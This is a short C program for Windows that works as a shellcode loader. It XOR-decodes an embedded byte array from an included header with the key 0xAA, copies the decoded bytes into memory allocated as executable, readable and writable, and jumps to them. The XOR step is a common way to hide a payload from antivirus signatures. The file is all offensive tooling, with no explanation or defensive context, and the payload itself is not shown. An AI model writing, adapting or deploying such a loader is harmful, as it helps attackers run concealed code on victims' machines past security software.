#include <windows.h>
#include <stdio.h>
#include "shellcode.h"

unsigned char key = 0xAA;

int main() {
    for (int i = 0; i < shellcode_xored_bin_len; i++)
        shellcode_xored_bin[i] ^= key;

    LPVOID exec = VirtualAlloc(0, shellcode_xored_bin_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec) return -1;

    memcpy(exec, shellcode_xored_bin, shellcode_xored_bin_len);

    ((void(*)())exec)();
    return 0;
}
